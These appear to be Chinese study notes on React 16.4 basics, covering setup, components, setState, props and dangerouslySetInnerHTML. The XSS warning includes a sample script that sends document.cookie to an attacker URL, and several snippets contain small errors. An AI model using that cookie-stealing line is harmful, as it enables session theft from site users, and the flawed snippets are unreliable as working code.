# React16.4

一.安装

    1.npm install -g create-react-app
    2.create-react-app reactDemo
    

二.文件目录

    1. src/index.js 为入口文件
    
    
三.基础用法

    1. import React ,{ Component , Fragment } from 'react';   /* Fragment为占位符，在页面上不会显示这个元素 */
        class (定义一个组件类) extends Component {
          constructor(props){
            super(props);

            /* 定义状态 */
            this.state = {
              inputValue : "",
              list : []
            }
          }

          render() {
            return (
              <Fragment>
              </Fragment>
            );
          }
        }
      
    2. 事件绑定

         在 constructor 中设置 bind this
         栗子 ： this.handleBtnClick = this.handleBtnClick.bind(this);

    3. react中 类名class要写成className , for 要写成 htmlFor, <label htmlFor="inputArea">请输入内容</label>
    
    4. 设置状态

         用法一 ： 
           this.setState({
            inputValue : ""
           });

         用法二 : 
           this.setState( (preState) => {
            return {
              list : [ ...this.State.list,...this.state.inputValue ],
              inputValue : ""
            };
           });

         用法三 : 
           /* preState 可以代替 this.state */
           this.setState( (preState) => ({
             list : [ ...preState.list,...preState.inputValue ],
             inputValue : "" 
           }))

    5. 父子组件通信
         
         ps ：react采用单项数据流，绝对不可以将父组件的 state 传递给子组件。
         
         假设这是一个子组件 <TodoItem /> , 那么我们可以这样将父组件的数据传给它 : 
            <TodoItem content = {item} /> // TodoItem 组件可以通过 this.props.content 拿到数据
         传递方法 : 
            ps : 一定要 记得 bind(this)
            <TodoItem  testBtn = {this.btnAlert.bind(this)} /> // TodoItem 组件可以通过 this.props.tesBtn() 调用方法
    
    6. dangerouslySetInnerHTML
         
         ps ：不合时宜的使用 innerHTML 可能会导致 cross-site scripting (XSS) 攻击。 
              净化用户的输入来显示的时候，经常会出现错误，不合适的净化也是导致网页攻击的原因之一。
              dangerouslySetInnerHTML 这个 prop 的命名是故意这么设计的，以此来警告.
              它的 prop 值(一个对象而不是字符串）应该被用来表明净化后的数据。
         
         dangerouslySetInnerHTML = {{__html : this.state.html}}
         
         ps : 恶意脚本 ，获取网页cookie
         <script>
           document.write('<img src=http://www.hackerhome.com/grabber.jsp?msg=' + document.cookie+' width=16 height=16 border=0 />');
         </script>
         
        
         
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
    
      
